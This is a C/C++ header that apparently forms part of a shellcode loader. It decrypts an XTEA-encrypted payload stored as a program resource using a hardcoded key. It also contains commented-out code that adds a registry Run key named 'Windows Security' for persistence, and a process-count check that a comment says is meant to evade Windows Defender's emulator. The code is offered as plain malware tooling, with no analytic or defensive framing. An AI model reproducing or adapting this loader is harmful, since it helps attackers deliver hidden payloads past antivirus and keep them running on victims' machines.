#pragma once
#include<tlhelp32.h>
#include <cstdio>
#define DELTA 0x9E3579B9
unsigned int key[4] = {0x12345678,0x98765432,0x19191919,0x13371337};
void XteaEncrypt(unsigned int num_rounds, unsigned int  v[2]) {
    unsigned int i;
    unsigned int v0 = v[0], v1 = v[1], sum = 0, delta = DELTA;
    for (i = 0; i < num_rounds; i++) {
        v0 += (((v1 << 4) ^ (v1 >> 5)) + v1) ^ (sum + key[sum & 3]);
        sum += delta;
        v1 += (((v0 << 4) ^ (v0 >> 5)) + v0) ^ (sum + key[(sum >> 11) & 3]);
    }
    v[0] = v0; v[1] = v1;
}
void XteaDecrypt(unsigned int num_rounds, unsigned int v[2]) {
    unsigned int i;
    unsigned int v0 = v[0], v1 = v[1], delta = DELTA, sum = delta * num_rounds;
    for (i = 0; i < num_rounds; i++) {
        v1 -= (((v0 << 4) ^ (v0 >> 5)) + v0) ^ (sum + key[(sum >> 11) & 3]);
        sum -= delta;
        v0 -= (((v1 << 4) ^ (v1 >> 5)) + v1) ^ (sum + key[sum & 3]);
    }
    v[0] = v0; v[1] = v1;
}

#define SOURCEID 100
unsigned char* GetShellcodeFromRes(int resourceID, unsigned int* shellcodeSize)
{
	//1.Get resource's pointer
	HRSRC hRsrc = FindResource(NULL, MAKEINTRESOURCE(resourceID), RT_RCDATA);
	if (hRsrc == NULL) {
		printf("FindResource error %d\n", GetLastError());
		return 0;
	}
	DWORD totalSize = SizeofResource(NULL, hRsrc);
	if (totalSize == 0) {
		printf("SizeofResource error %d\n", GetLastError());
		return 0;
	}
	HGLOBAL hGlobal = LoadResource(NULL, hRsrc);
	if (hGlobal == NULL) {
		printf("LoadResource error %d\n", GetLastError());
		return 0;
	}
	LPVOID pBuffer = LockResource(hGlobal);
	if (pBuffer == NULL) {
		printf("LockResource error %d\n", GetLastError());
		return 0;
	}

	//3.Getshellcode
	*shellcodeSize = totalSize;
	unsigned char* shellcode = (unsigned char*)malloc(*shellcodeSize);
	if (!shellcode) {
		printf("shellcode Malloc error\n");
		return 0;
	}
	memcpy(shellcode, (unsigned char*)pBuffer, *shellcodeSize);
	for (int i = 0; i < *shellcodeSize / 8; i++) {
		XteaDecrypt(32, (unsigned int*)(shellcode + 8 * i));
	}
	//printf("\n%x\n", *(unsigned int*)shellcode);
	return shellcode;
}

void AutoStart()
{
	/*HKEY hKey;
	char currentpath[256] = { 0 };
	GetModuleFileNameA(NULL, currentpath, 256);
	if (!RegCreateKeyA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey))
	{
		RegSetValueExA(hKey, "Windows Security", 0, REG_SZ, (PUCHAR)currentpath, strlen(currentpath));
		RegCloseKey(hKey);
	}*/
}

void AntiSimulation()
{
	//HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	//if (INVALID_HANDLE_VALUE == hSnapshot)
	//{
	//	return;
	//}
	//PROCESSENTRY32 pe = { sizeof(pe) };
	//int procnum = 0;
	//for (BOOL ret = Process32First(hSnapshot, &pe); ret; ret = Process32Next(hSnapshot, &pe))
	//{
	//	procnum++;
	//}
	//if (procnum <= 40)  //判断当前进程是否低于40个，目前见过能模拟最多进程的是WD能模拟39个
	//{
	//	exit(1);
	//}
}